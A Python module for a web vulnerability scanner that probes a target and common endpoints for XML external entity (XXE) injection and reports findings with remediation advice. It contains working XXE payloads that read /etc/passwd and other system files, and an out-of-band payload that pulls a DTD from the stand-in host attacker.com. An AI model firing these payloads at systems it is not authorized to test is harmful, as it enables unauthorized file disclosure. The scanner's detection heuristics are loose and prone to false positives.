from core.base_scanner import BaseScanner
from core.utils import RequestUtils
from typing import Dict, List, Optional
import logging
import re
import urllib.parse

class XXEInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        
        # Comprehensive XXE payloads
        self.payloads = [
            # Basic file read payloads
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><test>test</test>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///proc/version">%xxe;]><test>test</test>',
            
            # Error-based XXE
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///nonexistent">]><root>&test;</root>',
            
            # Out-of-band XXE (might not work in local testing)
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><test>test</test>'
        ]
        
        # Endpoints to test for XXE
        self.endpoints = [
            '/xxe',
            '/upload',
            '/import',
            '/api/data',
            '/xml',
            '/soap',
            '/parse',
            '/process',
            '/convert'
        ]

    def scan(self) -> Dict:
        """
        Perform XXE injection vulnerability scanning
        
        Returns:
            Dict of detected vulnerabilities
        """
        vulnerabilities = []
        
        # Test base URL
        base_result = self.test_xxe_injection(self.target_url)
        if base_result:
            vulnerabilities.append(base_result)
        
        # Test additional endpoints
        for endpoint in self.endpoints:
            full_url = self.target_url.rstrip('/') + endpoint
            result = self.test_xxe_injection(full_url)
            if result:
                vulnerabilities.append(result)
        
        return {
            'xxe_injection': vulnerabilities
        } if vulnerabilities else {}

    def test_xxe_injection(self, url: str) -> Optional[Dict]:
        """
        Test a specific URL for XXE injection vulnerabilities
        
        Args:
            url (str): URL to test
        
        Returns:
            Optional vulnerability details
        """
        for payload in self.payloads:
            try:
                # Test GET parameter
                get_url = f"{url}?xml={urllib.parse.quote(payload)}"
                get_response = self.make_request(get_url)
                
                if self.verify_xxe_injection(get_response, payload):
                    return self._create_vulnerability_report(url, get_url, payload)
                
                # Test POST parameter
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml,text/xml,*/*'
                }
                
                post_response = self.make_request(
                    url,
                    method='POST',
                    data={'xml': payload},
                    headers=headers
                )
                
                if self.verify_xxe_injection(post_response, payload):
                    return self._create_vulnerability_report(url, url, payload)
            
            except Exception as e:
                logging.error(f"Error testing XXE on {url}: {e}")
        
        return None

    def verify_xxe_injection(self, response, payload: str) -> bool:
        """
        Verify if the response indicates a successful XXE injection
        
        Args:
            response: HTTP response object
            payload (str): Injected payload
        
        Returns:
            bool: True if XXE injection is detected
        """
        if not response:
            return False
        
        # Convert response to lowercase for case-insensitive matching
        response_text = str(response.text).lower()
        
        # Comprehensive list of XXE indicators
        indicators = [
            'root:x:',      # /etc/passwd content
            'uid=',         # User ID
            'hostname=',    # Hostname disclosure
            'linux version', # System version
            'etc/passwd',   # File path
            'proc/version', # System version file
            'network/interfaces', # Network configuration
            'xml parsing error',  # XML parser error
            'undefined entity',   # XML entity error
            'fatal error',        # Generic error
            'simplexml_load',     # PHP XML parser error
            'javax.xml.parsers',  # Java XML parser error
        ]
        
        # Time-based detection for out-of-band XXE (placeholder)
        time_based_payload = 'http://attacker.com' in payload
        
        # Check for specific XXE indicators
        return (
            any(indicator in response_text for indicator in indicators) or
            (time_based_payload and response.status_code == 200)
        )

    def _create_vulnerability_report(self, base_url: str, full_url: str, payload: str) -> Dict:
        """
        Create a standardized vulnerability report
        
        Args:
            base_url (str): Base URL tested
            full_url (str): Full URL with payload
            payload (str): XXE payload used
        
        Returns:
            Dict containing vulnerability details
        """
        return {
            'type': 'XXE Injection',
            'url': base_url,
            'full_url': full_url,
            'payload': payload,
            'severity': 'High',
            'description': 'Potential XXE injection vulnerability detected',
            'recommendation': "\n".join([
                "1. Disable XML external entity processing",
                "2. Use secure XML parsers with XXE disabled",
                "3. Implement input validation for XML",
                "4. Use XML Schema validation",
                "5. Avoid using user-supplied XML input directly"
            ])
        }

    def execute_task(self, task: Dict) -> Optional[Dict]:
        """
        Execute a specific XXE injection task
        
        Args:
            task (Dict): Task configuration
        
        Returns:
            Optional vulnerability details
        """
        if task.get('type') == 'xxe_injection':
            return self.test_xxe_injection(task.get('url', ''))
        
        return None